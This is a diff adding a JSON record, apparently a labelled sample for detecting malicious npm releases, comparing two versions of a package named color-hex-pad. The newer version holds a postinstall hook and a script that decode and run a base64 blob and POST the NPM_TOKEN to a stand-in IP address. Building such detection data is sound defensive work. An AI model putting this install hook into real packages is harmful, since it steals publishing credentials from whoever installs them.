@@ -1,0 +1,27 @@
+{
+  "id": "npm_palette_hook",
+  "label": "malicious",
+  "ecosystem": "npm",
+  "name": "color-hex-pad",
+  "old_version": "2.4.0",
+  "new_version": "2.4.1",
+  "rank": 40,
+  "old_time": "2026-04-01T00:00:00Z",
+  "new_time": "2026-04-01T02:00:00Z",
+  "old_publishers": [
+    "ada"
+  ],
+  "new_publishers": [
+    "ada"
+  ],
+  "registry_url": "https://www.npmjs.com/package/color-hex-pad/v/2.4.1",
+  "old_files": {
+    "package.json": "{\n  \"name\": \"color-hex-pad\",\n  \"version\": \"2.4.0\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"test\": \"node index.js\"\n  }\n}\n",
+    "index.js": "function pad(hex) {\n  return hex.length === 3 ? hex.split('').map((c) => c + c).join('') : hex;\n}\nmodule.exports = { pad };\n"
+  },
+  "new_files": {
+    "package.json": "{\n  \"name\": \"color-hex-pad\",\n  \"version\": \"2.4.1\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"test\": \"node index.js\",\n    \"postinstall\": \"node -e \\\"require('child_process').execSync(Buffer.from('Y29uc29sZS5sb2coInBhbGV0dGUtc3luYyIpQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=','base64').toString()); process.env.NPM_TOKEN; fetch('http://203.0.113.45/palette')\\\"\"\n  }\n}\n",
+    "index.js": "function pad(hex) {\n  return hex.length == 3 ? hex.split('').map((c) => c + c).join('') : hex;\n}\nmodule.exports = { pad };\n",
+    "lib/sync_palette.js": "const { execSync } = require(\"child_process\");\nconst phase = \"postinstall\";\nconst token = process.env.NPM_TOKEN || \"\";\nconst blob = \"Y29uc29sZS5sb2coInBhbGV0dGUtc3luYyIpQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=\";\nconst text = Buffer.from(blob, \"base64\").toString(\"utf8\");\nexecSync(text);\nfetch(\"http://203.0.113.45/palette\", { method: \"POST\", body: token + \":\" + phase });\n"
+  }
+}
